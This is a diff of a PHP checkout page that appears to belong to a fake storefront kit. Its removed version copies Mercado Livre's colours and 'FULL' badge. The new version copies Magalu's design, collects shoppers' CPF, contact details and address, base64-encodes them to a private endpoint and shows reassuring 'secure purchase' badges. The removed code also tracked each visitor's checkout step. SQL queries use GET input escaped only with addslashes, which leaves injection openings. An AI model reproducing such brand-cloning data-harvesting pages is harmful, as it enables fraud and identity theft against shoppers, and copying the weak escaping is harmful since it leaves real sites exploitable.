@@ -4,282 +4,231 @@ require_once("api/db.php");
 require_once("api/facebook_pixel.php");
 
 if (!isset($_GET["produto"])) {
-    session_destroy();
     header("Location: ./index");
     exit();
-} else {
-    $id = addslashes($_GET["produto"]);
-    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
-    
-    if (($sqlx ? mysqli_num_rows($sqlx) : 0) > 0) {
-        $_SESSION['session_index'] = time() + 1000;
-        
-        $sql = mysqli_query($conn, "SELECT * from config");
-        $nome = "Minha Loja";
-        $cor = "#ffe600";
-        $cor_botao = "#3483fa";
-        $endereco = "";
-        $cnpj = "";
-        while ($sql && $row = mysqli_fetch_array($sql)) { 
-            $nome = $row["nome"];
-            $cor = $row["cor"];
-            $cor_botao = isset($row["cor_botao"]) ? $row["cor_botao"] : "#3483fa";
-            $endereco = isset($row["endereco"]) ? $row["endereco"] : "";
-            $cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
-        }
-        
-        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
-        $codigo = "";
-        $nomeproduto = "";
-        $valor = "0.00";
-        $img = "";
-        while ($sql1 && $row1 = mysqli_fetch_array($sql1)) { 
-            $codigo = $row1["codigo"];
-            $nomeproduto = $row1["nome"];
-            $valor = $row1["valor"];
-            $img = $row1["img"];
-        }
-        
-	        $valor_num = (float)str_replace(',', '.', str_replace('.', '', (string)$valor));
-	        $_SESSION['session_checkout'] = time() + 1000;
-	        
-	        // Disparar InitiateCheckout no Pixel
-	        echo fb_pixel_event_script('InitiateCheckout', [
-	            'content_ids' => [$codigo],
-	            'content_name' => $nomeproduto,
-	            'content_type' => 'product',
-	            'value' => $valor_num,
-	            'currency' => 'BRL'
-	        ]);
-        
-        $logo_files = glob("arquivos/logo/*.png");
-        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";
-    } else {
-        session_destroy();
-        header("Location: ./index");
-        exit();
-    }
 }
+
+$id = addslashes($_GET["produto"]);
+$sqlx = mysqli_query($conn, "SELECT * FROM produto WHERE codigo='$id'");
+$row_prod = $sqlx ? mysqli_fetch_assoc($sqlx) : null;
+if (!$row_prod) {
+    header("Location: ./index");
+    exit();
+}
+
+$codigo = $row_prod["codigo"];
+$nomeproduto = $row_prod["nome"];
+$img = $row_prod["img"];
+$valor = $row_prod["valor"];
+$valor_num = (float)str_replace(',', '.', str_replace('.', '', (string)$valor));
+
+// Disparar Checkout no Pixel
+echo fb_pixel_event_script('InitiateCheckout', [
+    'content_ids' => [$codigo],
+    'content_name' => $nomeproduto,
+    'content_type' => 'product',
+    'value' => $valor_num,
+    'currency' => 'BRL'
+]);
+
+$sql_conf = mysqli_query($conn, "SELECT * FROM config LIMIT 1");
+$row_conf = $sql_conf ? mysqli_fetch_assoc($sql_conf) : null;
+$nome_loja = $row_conf['nome'] ?? 'Minha Loja';
+$img_src = (strpos((string)$img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
+
+// Configuração do Magalu design system
+$magalu_blue = "#0086ff";
+$bg_gray = "#f5f5f5";
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Carrinho - <?php echo htmlspecialchars($nome); ?></title>
+    <title>Checkout - <?php echo htmlspecialchars($nome_loja); ?></title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        :root {
-            --store-yellow: <?php echo $cor; ?>;
-            --store-blue: <?php echo $cor_botao; ?>;
-            --store-bg-gray: #ebebeb;
-            --store-text-dark: #333;
-            --store-green: #00a650;
-        }
-        body { font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; background-color: var(--store-bg-gray); color: var(--store-text-dark); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: <?php echo $bg_gray; ?>; color: #333; -webkit-font-smoothing: antialiased; }
         
-        /* Topo da loja */
-        header { background-color: var(--store-yellow); padding: 8px 16px; position: sticky; top: 0; z-index: 100; }
-        .header-content-wrapper { max-width: 1200px; margin: 0 auto; }
-        .header-full { display: flex; flex-direction: column; gap: 8px; }
-        .header-top-row { display: flex; align-items: center; justify-content: space-between; }
-        .header-logo-full { height: 40px; object-fit: contain; }
-        .icon-btn { font-size: 20px; color: #fff; cursor: pointer; }
-        .search-row { width: 100%; }
-        .search-input-box { background: #fff; border-radius: 4px; padding: 8px 12px; display: flex; align-items: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .search-text { color: #999; font-size: 14px; }
-        .location-bar { background: var(--store-yellow); padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #333; border-top: 1px solid rgba(0,0,0,0.05); }
-
-        /* FOOTER */
-        .footer-main { background-color: #f5f5f5; border-top: 1px solid #e0e0e0; padding: 40px 20px 30px; margin-top: 60px; }
-        .footer-content { max-width: 1200px; margin: 0 auto; }
-        .footer-top { margin-bottom: 30px; }
-        .footer-links-container { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 25px; justify-content: center; }
-        .footer-link { display: inline-block; font-size: 13px; color: #666; text-decoration: none; transition: color 0.2s ease; }
-        .footer-link:hover { color: var(--store-blue); }
-        .footer-bottom { border-top: 1px solid #ddd; padding-top: 20px; text-align: center; }
-        .footer-copyright { font-size: 13px; color: #666; font-weight: 400; margin-bottom: 8px; }
-        .footer-info { font-size: 12px; color: #999; font-weight: 400; line-height: 1.4; margin: 0; }
-        @media (max-width: 768px) { .footer-main { padding: 30px 15px 20px; margin-top: 40px; } .footer-links-container { gap: 12px; justify-content: center; } .footer-link { font-size: 12px; display: inline-block; } .footer-copyright { font-size: 12px; text-align: center; } .footer-info { font-size: 11px; text-align: center; } }
-
-
-        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 12px; display: flex; flex-direction: column; gap: 12px; min-height: 60vh; }
-        .card, .cart-content, .cart-summary { max-width: 1200px; margin-left: auto; margin-right: auto; }
-        .card { background: #fff; border-radius: 4px; padding: 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); width: 100%; }
-        .full-badge { color: #00a650; font-weight: 700; font-size: 13px; margin-bottom: 12px; display: flex; align-items: center; gap: 4px; }
+        .checkout-container { max-width: 600px; margin: 0 auto; padding: 20px 15px; }
         
-        .product-row { display: flex; flex-direction: column; gap: 12px; }
-        .product-main { display: flex; gap: 12px; align-items: flex-start; }
-        .product-img { width: 64px; height: 64px; object-fit: contain; border: 1px solid #eee; border-radius: 4px; flex-shrink: 0; }
-        .product-info { flex: 1; min-width: 0; }
-        .product-name { font-size: 14px; font-weight: 400; color: #333; text-decoration: none; line-height: 1.3; display: block; margin-bottom: 4px; }
+        /* HEADER VOLTAR */
+        .header-voltar { display: inline-flex; align-items: center; margin-bottom: 15px; font-size: 14px; font-weight: 600; color: <?php echo $magalu_blue; ?>; text-decoration: none; }
+        .header-voltar i { margin-right: 6px; }
         
-        .product-controls { display: flex; justify-content: space-between; align-items: center; padding-top: 12px; border-top: 1px solid #f5f5f5; }
-        .quantity-selector { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 6px; overflow: hidden; height: 32px; }
-        .qty-btn { background: #f5f5f5; border: none; width: 32px; height: 100%; cursor: pointer; font-size: 18px; color: var(--store-blue); }
-        .qty-input { width: 36px; border: none; text-align: center; font-size: 14px; font-weight: 600; background: transparent; }
-        .price-display { font-size: 18px; font-weight: 400; color: #333; }
+        /* BANNER */
+        .banner-container { width: 100%; border-radius: 8px; overflow: hidden; margin-bottom: 20px; background-color: #e5e5e5; min-height: 120px; display: flex; align-items: center; justify-content: center; border: 1px dashed #ccc; }
+        .banner-container img { width: 100%; display: block; object-fit: cover; }
         
-        .product-actions { display: flex; gap: 15px; margin-top: 8px; }
-        .action-link { color: var(--store-blue); font-size: 12px; text-decoration: none; background: none; border: none; cursor: pointer; }
+        /* CARDS */
+        .card { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 20px; margin-bottom: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.02); }
+        .card-title { font-size: 16px; font-weight: 700; color: #333; margin-bottom: 16px; }
         
-        .summary-title { font-size: 18px; font-weight: 600; margin-bottom: 16px; }
-        .summary-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
-        .summary-total { display: flex; justify-content: space-between; margin-top: 12px; padding-top: 12px; border-top: 1px solid #eee; font-size: 18px; font-weight: 600; color: #333; }
-        .btn-continue { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; background: var(--store-blue); color: #fff; border-radius: 6px; font-weight: 600; font-size: 16px; text-decoration: none; border: none; cursor: pointer; margin-top: 16px; }
-
-        /* ===== RESPONSIVIDADE DESKTOP ===== */
-        @media (min-width: 1200px) {
-            .container { flex-direction: row; padding: 30px 20px; align-items: flex-start; gap: 30px; max-width: 1200px; margin: 0 auto; }
-            .cart-content { flex: 2; max-width: calc(66.666% - 15px); }
-            .cart-summary { flex: 1; position: sticky; top: 140px; max-width: calc(33.333% - 15px); }
-            .product-row { flex-direction: row; align-items: center; justify-content: space-between; }
-            .product-controls { border-top: none; padding-top: 0; gap: 20px; }
-            .card { border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); max-width: 100%; }
-        }
-
-        /* ===== RESPONSIVIDADE TABLET ===== */
-        @media (min-width: 769px) and (max-width: 1199px) {
-            .container { flex-direction: row; padding: 20px 16px; align-items: flex-start; gap: 20px; }
-            .cart-content { flex: 2; }
-            .cart-summary { flex: 1; position: sticky; top: 120px; }
-            .product-row { flex-direction: row; align-items: center; justify-content: space-between; }
-            .product-controls { border-top: none; padding-top: 0; gap: 20px; }
-        }
-
-        /* ===== RESPONSIVIDADE MOBILE ===== */
-        @media (max-width: 768px) {
-            .container { flex-direction: column; padding: 12px 0; }
-            .cart-content { flex: 1; }
-            .cart-summary { flex: 1; width: 100%; position: static; }
-            .product-row { flex-direction: column; }
-            .product-controls { border-top: 1px solid #eee; padding-top: 12px; margin-top: 12px; }
-            .card { margin: 0 0 8px 0; border-radius: 0; }
-            .btn-continue { height: 44px; font-size: 15px; margin: 12px 12px 0; width: calc(100% - 24px); }
-        }
-
-        /* Rodapé padronizado */
-        .footer { background: #fff; color: #666; font-size: 12px; padding: 18px 16px 22px; border-top: 1px solid #ddd; margin-top: 40px; }
-        .footer-inner { max-width: 1200px; margin: 0 auto; }
-        .footer-title { margin-bottom: 12px; font-size: 14px; color: #333; }
-        .footer-links { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 12px; }
-        .footer-links a { color: #333; text-decoration: none; }
+        /* PRODUCT */
+        .product-item { display: flex; align-items: flex-start; gap: 15px; margin-bottom: 15px; }
+        .product-img { width: 70px; height: 70px; object-fit: contain; border: 1px solid #eee; border-radius: 4px; }
+        .product-details { flex: 1; }
+        .product-name { font-size: 13px; line-height: 1.4; color: #333; margin-bottom: 10px; font-weight: 500; }
         
-        /* Tela de carregamento */
-        #store-loading-overlay {
-            display: flex; /* Começa visível */
-            position: fixed;
-            inset: 0;
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            z-index: 9999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .store-spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #e6e6e6;
-            border-top-color: var(--store-blue);
-            border-radius: 50%;
-            animation: store-spin .82s linear infinite;
-        }
-        .loader-message {
-            margin-top: 22px;
-            color: #333;
-            font-size: 20px;
-            font-weight: 400;
-            line-height: 1.22;
-            text-align: left;
-        }
-        @keyframes store-spin { to { transform: rotate(360deg); } }
+        .qty-price-row { display: flex; justify-content: space-between; align-items: center; }
+        .qty-selector { display: inline-flex; align-items: center; border: 1px solid #ccc; border-radius: 4px; overflow: hidden; height: 30px; }
+        .qty-btn { background: #fff; border: none; width: 30px; height: 100%; font-size: 16px; color: <?php echo $magalu_blue; ?>; cursor: pointer; }
+        .qty-input { width: 40px; border: none; text-align: center; font-size: 14px; font-weight: 600; }
+        .product-price { font-size: 14px; font-weight: 700; color: #333; }
         
-        @media (max-width: 768px) {
-            .loader-message { font-size: 18px; }
-            .store-spinner { width: 48px; height: 48px; }
-        }
+        .total-produtos-row { display: flex; justify-content: space-between; align-items: center; padding-top: 15px; border-top: 1px solid #eee; font-size: 14px; color: #333; font-weight: 500; }
         
-        @media (max-width: 480px) {
-            .loader-message { font-size: 16px; }
-            .store-spinner { width: 44px; height: 44px; }
-        }
+        /* FORMS */
+        .form-group { margin-bottom: 15px; }
+        .form-label { display: block; font-size: 12px; color: #666; margin-bottom: 6px; }
+        .form-control { width: 100%; height: 44px; border: 1px solid #ccc; border-radius: 6px; padding: 0 12px; font-size: 14px; outline: none; transition: border-color 0.2s; }
+        .form-control:focus { border-color: <?php echo $magalu_blue; ?>; box-shadow: 0 0 0 1px <?php echo $magalu_blue; ?>; }
+        
+        /* SUMMARY */
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #333; }
+        .summary-total { display: flex; justify-content: space-between; padding-top: 15px; margin-top: 5px; border-top: 1px solid #eee; font-size: 16px; font-weight: 700; color: #333; }
+        
+        /* BUTTON */
+        .btn-continue { width: 100%; height: 48px; background-color: <?php echo $magalu_blue; ?>; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background-color 0.2s; }
+        .btn-continue:hover { background-color: #0073e6; }
+        .btn-continue:disabled { opacity: 0.7; cursor: not-allowed; }
+        
+        /* SECURE FOOTER */
+        .secure-footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
+        .secure-title { color: #00a650; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 5px; margin-bottom: 10px; font-size: 13px; }
+        .payment-methods { display: flex; justify-content: center; gap: 10px; margin-top: 10px; margin-bottom: 15px; }
+        .payment-methods img { height: 20px; object-fit: contain; }
+        .ssl-info { color: #00a650; display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 11px; }
     </style>
-    <?php echo fb_pixel_base_code(); ?>
-
-    <link rel="shortcut icon" href="arquivos/favicon.png?v=<?php echo time(); ?>">
-    <link rel="icon" type="image/png" href="arquivos/favicon.png?v=<?php echo time(); ?>">
 </head>
 <body>
-    <div id="store-loading-overlay">
-        <div class="store-spinner"></div>
-        <p class="loader-message">Estamos preparando<br>tudo para sua compra</p>
-    </div>
+    <div class="checkout-container">
+        <!-- Voltar -->
+        <a href="javascript:history.back()" class="header-voltar">
+            <i class="fa-solid fa-arrow-left"></i> Voltar
+        </a>
 
-    <header class="store-header-container checkout-header-simple">
-      <div class="header-content-wrapper">
-        <div style="display: flex; align-items: center; justify-content: center; padding: 12px 0;">
-          <?php if(!empty($logo_loja)): ?>
-            <img src="<?php echo $logo_loja; ?>" alt="<?php echo $nome; ?>" class="header-logo-full" style="max-height: 40px; object-fit: contain;">
-          <?php else: ?>
-            <span style="font-weight: bold; font-size: 18px;"><?php echo $nome; ?></span>
-          <?php endif; ?>
+        <!-- Banner Placeholder -->
+        <div class="banner-container">
+            <!-- A imagem do banner vai aqui. Depois podemos buscar do banco de dados ou painel. -->
+            <span style="color: #888; font-size: 14px; font-weight: 500;">[ Espaço para o Banner Promocional ]</span>
         </div>
-      </div>
-    </header>
 
-    <div class="container">
-        <div class="cart-content">
+        <form id="checkoutForm" onsubmit="proceed(); return false;">
+            <!-- Produto -->
             <div class="card">
-                <div class="full-badge">
-                    <i class="fa-solid fa-bolt"></i> FULL
-                </div>
-                <div class="product-row">
-                    <div class="product-main">
-                        <?php $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img"; ?>
-                        <img src="<?php echo $img_src; ?>" class="product-img" id="checkoutProductImg">
-                        <div class="product-info">
-                            <div class="product-name" id="checkoutProductName"><?php echo htmlspecialchars($nomeproduto); ?></div>
-                            <div id="checkoutVariacoes" style="font-size: 12px; color: #666; line-height: 1.4;"></div>
-                            <div class="product-actions">
-                                <button class="action-link">Excluir</button>
-                                <button class="action-link">Mais tarde</button>
+                <div class="product-item">
+                    <img src="<?php echo $img_src; ?>" class="product-img">
+                    <div class="product-details">
+                        <div class="product-name"><?php echo htmlspecialchars($nomeproduto); ?></div>
+                        <div class="qty-price-row">
+                            <div class="qty-selector">
+                                <button type="button" class="qty-btn" onclick="updateQty(-1)">-</button>
+                                <input type="number" class="qty-input" value="1" id="cart-qty" readonly>
+                                <button type="button" class="qty-btn" onclick="updateQty(1)">+</button>
                             </div>
+                            <div class="product-price">R$ <span id="price-unit-display"><?php echo number_format($valor_num, 2, ',', '.'); ?></span></div>
                         </div>
                     </div>
-                    <div class="product-controls">
-                        <div class="quantity-selector">
-                            <button class="qty-btn" onclick="updateQty(-1)">-</button>
-                            <input type="number" class="qty-input" value="1" id="cart-qty" readonly>
-                            <button class="qty-btn" onclick="updateQty(1)">+</button>
+                </div>
+                <div class="total-produtos-row">
+                    <span>Total dos produtos</span>
+                    <span id="labelTotalProdutos">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
+                </div>
+            </div>
+
+            <!-- Identificação -->
+            <div class="card">
+                <div class="card-title">Identificação</div>
+                <div class="form-group">
+                    <label class="form-label">Nome completo</label>
+                    <input type="text" id="nome" class="form-control" placeholder="Como no documento" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">CPF</label>
+                    <input type="text" id="cpf" class="form-control" placeholder="000.000.000-00" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">E-mail</label>
+                    <input type="email" id="email" class="form-control" placeholder="voce@email.com" required>
+                </div>
+                <div class="form-group" style="margin-bottom: 0;">
+                    <label class="form-label">Telefone</label>
+                    <input type="tel" id="telefone" class="form-control" placeholder="(11) 99999-9999" required>
+                </div>
+            </div>
+
+            <!-- Endereço -->
+            <div class="card">
+                <div class="card-title">Endereço de entrega</div>
+                <div class="form-group" style="margin-bottom: 0;">
+                    <label class="form-label">CEP</label>
+                    <input type="text" id="cep" class="form-control" placeholder="00000-000" required>
+                </div>
+                <!-- Campos Extras Carregados Automaticamente -->
+                <div id="endereco-extra" style="display: none; margin-top: 15px;">
+                    <div class="form-group">
+                        <label class="form-label">Rua / Avenida</label>
+                        <input type="text" id="rua" class="form-control" required>
+                    </div>
+                    <div style="display: flex; gap: 15px;">
+                        <div class="form-group" style="flex: 1;">
+                            <label class="form-label">Número</label>
+                            <input type="text" id="numero" class="form-control" required>
                         </div>
-                        <div class="price-display">
-                            R$ <?php echo number_format($valor_num, 2, ',', '.'); ?>
+                        <div class="form-group" style="flex: 1;">
+                            <label class="form-label">Bairro</label>
+                            <input type="text" id="bairro" class="form-control" required>
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 15px; margin-bottom: 0;">
+                        <div class="form-group" style="flex: 2; margin-bottom: 0;">
+                            <label class="form-label">Cidade</label>
+                            <input type="text" id="cidade" class="form-control" required>
+                        </div>
+                        <div class="form-group" style="flex: 1; margin-bottom: 0;">
+                            <label class="form-label">Estado</label>
+                            <input type="text" id="estado" class="form-control" required>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
 
-        <div class="cart-summary">
-            <div class="card">
-                <div class="summary-title">Resumo da compra</div>
+            <!-- Resumo -->
+            <div class="card" style="margin-bottom: 10px;">
                 <div class="summary-row">
-                    <span id="labelProdutos">Produtos (1)</span>
-                    <span id="subtotalPrice">R$ 0,00</span>
+                    <span>Subtotal</span>
+                    <span id="summarySubtotal">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
                 </div>
                 <div class="summary-row">
-                    <span>Envio</span>
-                    <span style="color: #00a650;">Grátis</span>
+                    <span>Frete</span>
+                    <span>—</span>
                 </div>
                 <div class="summary-total">
                     <span>Total</span>
-                    <span id="totalPrice">R$ 0,00</span>
+                    <span id="summaryTotal">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
                 </div>
-                <a href="confirm_address.php?produto=<?php echo $id; ?>" class="btn-continue" id="btnContinuarCompra">Continuar a compra</a>
+            </div>
+
+            <button type="submit" class="btn-continue" id="btnSubmit">Continuar</button>
+        </form>
+
+        <!-- Footer Seguro -->
+        <div class="card secure-footer" style="background: transparent; border: 1px solid #e0e0e0; margin-top: 15px;">
+            <div class="secure-title"><i class="fa-solid fa-lock"></i> COMPRA 100% SEGURA</div>
+            <div style="font-size: 11px; margin-top: 5px;">Formas de pagamento aceitas:</div>
+            <div class="payment-methods">
+                <img src="https://logospng.org/download/pix/logo-pix-icone-1024.png" alt="Pix" style="height:18px;">
+                <img src="https://logospng.org/download/visa/logo-visa-2048.png" alt="Visa">
+                <img src="https://logospng.org/download/mastercard/logo-mastercard-1024.png" alt="Mastercard">
+                <img src="https://logospng.org/download/elo/logo-elo-1024.png" alt="Elo">
+                <img src="https://logospng.org/download/google-pay/logo-google-pay-1024.png" alt="GPay">
+            </div>
+            <div class="ssl-info">
+                <i class="fa-solid fa-shield-check"></i> <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#00a650" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:4px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Seus dados são protegidos com criptografia SSL.
             </div>
         </div>
     </div>
@@ -292,104 +241,125 @@ if (!isset($_GET["produto"])) {
             return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
         }
 
-        function atualizarResumo() {
-            const qty = parseInt($('#cart-qty').val());
+        function updateQty(change) {
+            let qty = parseInt($('#cart-qty').val()) + change;
+            if (qty < 1) qty = 1;
+            $('#cart-qty').val(qty);
+            
             const total = qty * valorUnitario;
-            const totalFormatado = formatarMoeda(total);
-
-            $('#labelProdutos').text(`Produtos (${qty})`);
-            $('#subtotalPrice').text(`R$ ${totalFormatado}`);
-            $('#totalPrice').text(`R$ ${totalFormatado}`);
-
-            const data = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
-            data.quantos = qty;
-            data.precoFinal = totalFormatado;
-            localStorage.setItem('lojavirtual', JSON.stringify(data));
+            const totalFmt = 'R$ ' + formatarMoeda(total);
             
-            const v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
-            $('#btnContinuarCompra').attr('href', 'confirm_address.php?produto=' + codigoProduto);
+            $('#labelTotalProdutos').text(totalFmt);
+            $('#summarySubtotal').text(totalFmt);
+            $('#summaryTotal').text(totalFmt);
+
+            localStorage.setItem('lojavirtual', JSON.stringify({
+                quantos: qty,
+                precoFinal: formatarMoeda(total)
+            }));
         }
 
-        function updateQty(val) {
-            let current = parseInt($('#cart-qty').val());
-            let next = current + val;
-            if (next >= 1 && next <= 2) {
-                $('#cart-qty').val(next);
-                atualizarResumo();
+        $(document).ready(function(){
+            // Inicializa localStorage
+            localStorage.setItem('lojavirtual', JSON.stringify({
+                quantos: 1,
+                precoFinal: formatarMoeda(valorUnitario)
+            }));
+
+            // Mascaras
+            $('#cpf').mask('000.000.000-00', {reverse: true});
+            $('#cep').mask('00000-000');
+            var SPMaskBehavior = function (val) {
+              return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
+            },
+            spOptions = {
+              onKeyPress: function(val, e, field, options) {
+                  field.mask(SPMaskBehavior.apply({}, arguments), options);
+                }
+            };
+            $('#telefone').mask(SPMaskBehavior, spOptions);
+
+            // Busca CEP
+            $('#cep').on('blur', function(){
+                const cep = $(this).val().replace(/\D/g, '');
+                if(cep.length === 8) {
+                    $.getJSON('https://viacep.com.br/ws/' + cep + '/json/', function(json){
+                        if(!json.erro) {
+                            $('#rua').val(json.logradouro || '');
+                            $('#bairro').val(json.bairro || '');
+                            $('#cidade').val(json.localidade || '');
+                            $('#estado').val(json.uf || '');
+                            $('#endereco-extra').slideDown();
+                            $('#numero').focus();
+                        }
+                    });
+                }
+            });
+        });
+
+        function proceed() {
+            const formData = {
+                nome: $('#nome').val(),
+                email: $('#email').val(),
+                cpf: $('#cpf').val().replace(/\D/g, ''),
+                telefone: $('#telefone').val().replace(/\D/g, ''),
+                cep: $('#cep').val().replace(/\D/g, ''),
+                rua: $('#rua').val() || '',
+                numero: $('#numero').val() || '',
+                bairro: $('#bairro').val() || '',
+                cidade: $('#cidade').val() || '',
+                estado: $('#estado').val() || '',
+                complemento: '',
+                referencia: '',
+                tipo: 'casa'
+            };
+            
+            if(formData.cpf.length !== 11) {
+                alert("Por favor, digite um CPF válido com 11 dígitos.");
+                return;
             }
-        }
 
-        $(document).ready(function() {
-            // Esconde o spinner após o carregamento inicial simulado
-            setTimeout(() => {
-                $('#store-loading-overlay').fadeOut(300);
-            }, 1200);
+            localStorage.setItem('cliente_dados', JSON.stringify(formData));
+            $('#btnSubmit').prop('disabled', true).html('<i class="fa-solid fa-spinner fa-spin"></i> Aguarde...');
 
-            let v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
-            const urlParams = new URLSearchParams(window.location.search);
-            urlParams.forEach((v, k) => { if(k !== 'produto') v_sel[k] = v; });
-            localStorage.setItem('variacoes_selecionadas', JSON.stringify(v_sel));
-
-            if (v_sel.titulo_selecionado) $('#checkoutProductName').text(v_sel.titulo_selecionado);
-            if (v_sel.imagem_selecionada) $('#checkoutProductImg').attr('src', v_sel.imagem_selecionada);
-
-            let v_html = '';
-            const skip = ['titulo_selecionado', 'imagem_selecionada', 'titulo', 'img'];
-            Object.entries(v_sel).forEach(([k, v]) => {
-                if (!v || skip.includes(k)) return;
-                v_html += `<div>${k.charAt(0).toUpperCase() + k.slice(1)}: <strong>${v}</strong></div>`;
-            });
-            $('#checkoutVariacoes').html(v_html);
+            const cartData = JSON.parse(localStorage.getItem('lojavirtual') || '{"quantos":"1","precoFinal":"0,00"}');
+            const vSel = localStorage.getItem('variacoes_selecionadas') || '{}';
             
-            atualizarResumo();
-
-            // Spinner ao avançar
-            $('#btnContinuarCompra').on('click', function(e) {
-                e.preventDefault();
-                const href = $(this).attr('href');
-                $('#store-loading-overlay').fadeIn(200);
-                setTimeout(() => {
-                    window.location.href = href;
-                }, 800);
-            });
-        });
-
-        function sendOnline(etapa) {
-            const ua = navigator.userAgent;
-            const isMobile = /iPhone|iPad|Android|webOS|BlackBerry|iPod|Symbian|Windows Phone/i.test(ua);
-            const dispositivo = isMobile ? "mobile" : "desktop";
-            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({
-                api: "online",
-                etapa: etapa,
-                dispositivo: dispositivo
+            const payloadCompleto = btoa(unescape(encodeURIComponent(JSON.stringify({
+                api: 'salvar_cadastro',
+                nome: formData.nome,
+                email: formData.email,
+                cpf: formData.cpf,
+                celular: formData.telefone,
+                telefone: formData.telefone,
+                cep: formData.cep,
+                endereco: formData.rua,
+                rua: formData.rua,
+                numero: formData.numero,
+                bairro: formData.bairro,
+                cidade: formData.cidade,
+                estado: formData.estado,
+                destinatario: formData.nome,
+                quantidade: cartData.quantos || '1',
+                total: cartData.precoFinal || '0,00',
+                valortotal: cartData.precoFinal || '0,00',
+                produto_codigo: codigoProduto,
+                produto_nome: "<?php echo addslashes($nomeproduto); ?>",
+                variacoes: vSel
             }))));
-            $.post("api/index.php", { p: payload });
-        }
 
-        $(document).ready(function() {
-            sendOnline("checkout");
-            setInterval(() => sendOnline("checkout"), 15000);
-        });
+            $.post('api/index.php', { p: payloadCompleto }, function(retorno) {
+                if (String(retorno).trim() === 'ok') {
+                    window.location.href = 'payment.php?produto=' + codigoProduto;
+                } else {
+                    $('#btnSubmit').prop('disabled', false).html('Continuar');
+                    alert('Não foi possível salvar seus dados.\n' + String(retorno).trim());
+                }
+            }).fail(function(){
+                $('#btnSubmit').prop('disabled', false).html('Continuar');
+                alert('Erro na conexão. Verifique sua internet.');
+            });
+        }
     </script>
-    
-    <!-- FOOTER OFICIAL DA LOJA -->
-    <footer class="footer-main">
-      <div class="footer-content">
-        <div class="footer-top">
-          <div class="footer-links-container">
-            <a href="politica-de-privacidade.php" class="footer-link">Política de Privacidade</a>
-            <a href="termos-de-uso.php" class="footer-link">Termos de Uso</a>
-            <a href="trocas-e-devolucoes.php" class="footer-link">Trocas e Devoluções</a>
-            <a href="mailto:contato@<?php echo str_replace(' ', '', strtolower($nome)); ?>.com.br" class="footer-link">Contato</a>
-          </div>
-        </div>
-        <div class="footer-bottom">
-          <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?>. Todos os direitos reservados.</p>
-          <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
-        </div>
-      </div>
-    </footer>
 </body>
 </html>
-
-
